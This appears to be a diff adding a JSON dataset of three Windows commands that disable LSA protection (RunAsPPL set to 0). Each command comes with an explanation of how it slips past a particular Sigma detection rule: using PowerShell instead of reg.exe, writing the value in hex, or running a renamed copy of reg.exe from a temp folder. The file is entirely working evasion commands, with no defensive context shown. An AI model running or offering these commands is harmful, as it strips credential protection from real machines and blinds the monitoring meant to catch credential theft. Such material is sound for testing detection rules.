@@ -1,0 +1,14 @@
+[
+  {
+    "output": "powershell.exe -Command \"Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name 'RunAsPPL' -Value 0\"",
+    "explanation": "The Sigma rule specifically targets the execution of 'reg.exe'. By using PowerShell's native 'Set-ItemProperty' cmdlet, the same registry modification is achieved without triggering the 'selection_img' criteria (the reg.exe binary)."
+  },
+  {
+    "output": "reg  add  \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\"  /v  RunAsPPL  /d  0x0  /f",
+    "explanation": "The rule looks for the literal string ' /d 0'. By using '0x0' (hexadecimal notation) instead of '0', the logical outcome is the same (disabling PPL), but the string-based command line filter is bypassed."
+  },
+  {
+    "output": "copy C:\\Windows\\System32\\reg.exe C:\\Windows\\Temp\\not_reg.exe && C:\\Windows\\Temp\\not_reg.exe add \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" /v RunAsPPL /d 0 /f",
+    "explanation": "While the rule checks for OriginalFileName, some SIEM implementations or telemetry sources might rely heavily on the 'Image' field (process path). Renaming the binary and executing it from a temporary location can sometimes bypass simple path-based detections if the 'OriginalFileName' metadata is not properly captured or indexed."
+  }
+]
